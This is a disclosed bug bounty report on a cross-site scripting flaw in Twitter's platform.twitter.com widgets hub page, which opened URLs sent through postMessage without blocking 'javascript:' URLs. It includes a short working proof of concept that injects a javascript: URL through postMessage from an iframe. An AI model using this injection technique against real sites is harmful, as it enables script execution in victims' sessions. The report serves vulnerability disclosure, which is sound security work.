@@ -1,0 +1,50 @@
+ReportLink:https://hackerone.com/reports/29328
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/batram
+ReportedTo:Twitter(twitter)
+BountyAmount:1120.0
+Severity:
+State:Closed
+DateOfDisclosure:17.11.2014 14:30:52
+
+Summary:
+
+Since you have fixed a few problems with the FlashTransport on platform.twitter.com already,
+I though I would also take a look at the JavaScript around it.
+
+_Problem URL:_
+https://platform.twitter.com/widgets/hub.html
+
+__Description:__
+The mentioned page opens URLs send to it via postMessage or FlashTransport without checking for an 'javascript:'-prefix, resulting in XSS on platform.twitter.com. Since the URL gets open in a popup, popups need to be allowed or the opening a result of user interaction. 
+
+__PoC:__
+
+    <iframe src="https://platform.twitter.com/widgets/hub.html" id="iframe"></iframe>
+
+    <script>
+      var win = document.getElementById("iframe").contentWindow
+
+      function fire() {
+        win.postMessage(
+          '{"id": 12, "method": "openIntent", "params":["javascript:alert(document.domain)"]}',
+          "https://platform.twitter.com/" 
+        )
+      }
+
+      function listener(e){
+        console.log(e.data);
+        if(e.data == '__ready__')
+          fire();
+      }
+
+      if (window.addEventListener){
+        addEventListener("message", listener, false)
+      } else {
+        attachEvent("onmessage", listener)
+      }
+    </script>
+
+
+Tested in:
+ Win 8.1 | Google Chrome | Version 39.0.2166.2 dev-m (64-bit)
